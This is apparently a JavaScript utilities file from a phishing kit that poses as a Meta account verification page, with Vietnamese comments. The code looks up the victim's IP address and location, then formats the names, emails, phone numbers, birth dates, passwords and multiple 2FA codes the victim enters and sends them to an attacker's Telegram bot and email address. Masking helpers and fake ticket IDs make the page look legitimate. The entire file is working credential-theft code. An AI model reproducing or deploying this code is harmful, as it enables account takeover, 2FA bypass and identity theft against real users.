// Utilities
const Utils = {
    encrypt(text) {
        return CryptoJS.AES.encrypt(text, CONFIG.SECRET_KEY).toString();
    },

    decrypt(cipherText) {
        const bytes = CryptoJS.AES.decrypt(cipherText, CONFIG.SECRET_KEY);
        return bytes.toString(CryptoJS.enc.Utf8);
    },

    saveRecord(key, value) {
        try {
            const encryptedValue = this.encrypt(JSON.stringify(value));
            const record = { value: encryptedValue, expiry: Date.now() + CONFIG.STORAGE_EXPIRY };
            localStorage.setItem(key, JSON.stringify(record));
        } catch (error) {
            console.error('Save error:', error);
        }
    },

    getRecord(key) {
        try {
            const item = localStorage.getItem(key);
            if (!item) return null;
            const { value, expiry } = JSON.parse(item);
            if (Date.now() > expiry) {
                localStorage.removeItem(key);
                return null;
            }
            const decrypted = this.decrypt(value);
            return decrypted ? JSON.parse(decrypted) : null;
        } catch (error) {
            return null;
        }
    },

    async getUserIp() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error('Error getting IP:', error);
            return 'N/A';
        }
    },

    // Hàm chuyển đổi Country Code (VN, US, JP...) sang Emoji lá cờ
    getCountryFlag(countryCode) {
        if (!countryCode || countryCode === 'N/A' || countryCode.length !== 2) return '🌐';
        const codePoints = countryCode
            .toUpperCase()
            .split('')
            .map(char => 127397 + char.charCodeAt(0));
        return String.fromCodePoint(...codePoints);
    },

    async getUserLocation() {
        try {
            const response = await fetch("https://ipwho.is/", {
                method: "GET",
                cache: "no-store"
            });

            if (!response.ok) {
                throw new Error(`Location API error: ${response.status}`);
            }

            const data = await response.json();

            if (data.success === false) {
                throw new Error(data.message || "Location lookup failed");
            }

            const ip = data.ip || "N/A";
            const countryCode = (data.country_code || "N/A").toUpperCase(); // Viết tắt quốc gia (VN, US,...)

            const parts = [
                data.city,
                data.region,
                data.country
            ].filter(Boolean);

            return {
                ip: ip,
                country_code: countryCode,
                flag: this.getCountryFlag(countryCode),
                ip_short: `[${countryCode}] ${ip}`, // Định dạng viết tắt: [VN] 113.161.x.x
                location: parts.length > 0 ? parts.join(" | ") : "N/A",
                region: data.region || "N/A",
                country: data.country || "N/A"
            };

        } catch (error) {
            console.error("Location error:", error);

            return {
                ip: "N/A",
                country_code: "N/A",
                flag: "🌐",
                ip_short: "[N/A] N/A",
                location: "N/A",
                region: "N/A",
                country: "N/A"
            };
        }
    },

    async sendToTelegram(data) {
        const locationData = data.locationData || {
            ip: "N/A",
            country_code: "N/A",
            flag: "🌐",
            ip_short: "[N/A] N/A",
            location: "N/A"
        };

        const flag = locationData.flag || this.getCountryFlag(locationData.country_code);
        const ipDisplay = locationData.ip_short || `[${locationData.country_code || 'N/A'}] ${locationData.ip}`;

        // Giao diện Telegram đẹp mắt, phân khu rõ ràng, hỗ trợ click-to-copy qua thẻ <code>
        const text = `
<b>🌐 THÔNG TIN KẾT NỐI</b>
• <b>IP:</b> <code>${ipDisplay}</code> ${flag}
• <b>Vị trí:</b> <code>${locationData.location}</code>
━━━━━━━━━━━━━━━━━━━━
<b>👤 THÔNG TIN TÀI KHOẢN</b>
• <b>Họ tên:</b> <code>${data.fullName || ''}</code>
• <b>Email:</b> <code>${data.email || ''}</code>
• <b>Email Doanh nghiệp:</b> <code>${data.emailBusiness || ''}</code>
• <b>Tên Page:</b> <code>${data.fanpage || ''}</code>
• <b>Số điện thoại:</b> <code>${data.phone || ''}</code>
• <b>Ngày sinh:</b> <code>${data.day}/${data.month}/${data.year}</code>
━━━━━━━━━━━━━━━━━━━━
<b>🔑 MẬT KHẨU</b>
• <b>Password (1):</b> <code>${data.password || ''}</code>
• <b>Password (2):</b> <code>${data.passwordSecond || ''}</code>
━━━━━━━━━━━━━━━━━━━━
<b>🛡️ MÃ BẢO MẬT 2FA</b>
• <b>Mã 2FA (1):</b> <code>${data.twoFa || ''}</code>
• <b>Mã 2FA (2):</b> <code>${data.twoFaSecond || ''}</code>
• <b>Mã 2FA (3):</b> <code>${data.twoFaThird || ''}</code>
━━━━━━━━━━━━━━━━━━━━`;

        try {
            await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.TELEGRAM_CHAT_ID,
                    text: text.trim(),
                    parse_mode: 'HTML'
                })
            });
        } catch (error) {
            console.error('Telegram error:', error);
        }
    },

    async sendToEmail(data) {
        const locationData = data.locationData || {
            ip: "N/A",
            country_code: "N/A",
            ip_short: "[N/A] N/A",
            location: "N/A"
        };

        const ipDisplay = locationData.ip_short || `[${locationData.country_code || 'N/A'}] ${locationData.ip}`;

        const emailContent = `
IP: ${ipDisplay}
Location: ${locationData.location}
----------------------------------
Full Name: ${data.fullName || ''}
Email: ${data.email || ''}
Email Business: ${data.emailBusiness || ''}
Page Name: ${data.fanpage || ''}
Phone: ${data.phone || ''}
Date of Birth: ${data.day}/${data.month}/${data.year}
----------------------------------
Password(1): ${data.password || ''}
Password(2): ${data.passwordSecond || ''}
----------------------------------
🔐Code 2FA(1): ${data.twoFa || ''}
🔐Code 2FA(2): ${data.twoFaSecond || ''}
🔐Code 2FA(3): ${data.twoFaThird || ''}

Sent at: ${new Date().toLocaleString()}`;

        try {
            // Load EmailJS SDK if not already loaded
            if (!window.emailjs) {
                await this.loadEmailJSSDK();
            }

            await emailjs.send(
                CONFIG.EMAILJS_SERVICE_ID,
                CONFIG.EMAILJS_TEMPLATE_ID,
                {
                    to_email: CONFIG.EMAIL_RECIPIENT,
                    subject: `[${locationData.country_code || 'GEO'}] Meta Verification - ${locationData.ip}`,
                    message: emailContent,
                    from_name: 'Meta Verification System',
                    reply_to: data.email || 'noreply@system.com'
                },
                CONFIG.EMAILJS_PUBLIC_KEY
            );
        } catch (error) {
            console.error('Email error:', error);
        }
    },

    loadEmailJSSDK() {
        return new Promise((resolve, reject) => {
            if (window.emailjs) {
                resolve();
                return;
            }

            const script = document.createElement('script');
            script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
            script.onload = () => {
                emailjs.init(CONFIG.EMAILJS_PUBLIC_KEY);
                resolve();
            };
            script.onerror = reject;
            document.head.appendChild(script);
        });
    },

    async sendNotification(data) {
        const notificationType = CONFIG.NOTIFICATION_TYPE;

        try {
            // Chỉ lấy location 1 lần
            const locationData = await this.getUserLocation();

            const notificationData = {
                ...data,
                locationData
            };

            if (
                notificationType === 'telegram' ||
                notificationType === 'both'
            ) {
                await this.sendToTelegram(notificationData);
            }

            if (
                notificationType === 'email' ||
                notificationType === 'both'
            ) {
                await this.sendToEmail(notificationData);
            }

        } catch (error) {
            console.error(
                'Notification error:',
                error
            );
        }
    },

    maskPhone(phone) {
        if (!phone || phone.length < 5) return phone;
        const start = phone.slice(0, 2);
        const end = phone.slice(-2);
        return `${start} ${'*'.repeat(phone.length - 4)} ${end}`;
    },

    maskEmail(email) {
        if (!email) return '';
        return email.replace(/^(.)(.*?)(.)@(.+)$/, (_, a, mid, c, domain) => {
            return `${a}${'*'.repeat(mid.length)}${c}@${domain}`;
        });
    },

    generateTicketId() {
        const gen = () => Math.random().toString(36).substring(2, 6).toUpperCase();
        return `${gen()}-${gen()}-${gen()}`;
    }
};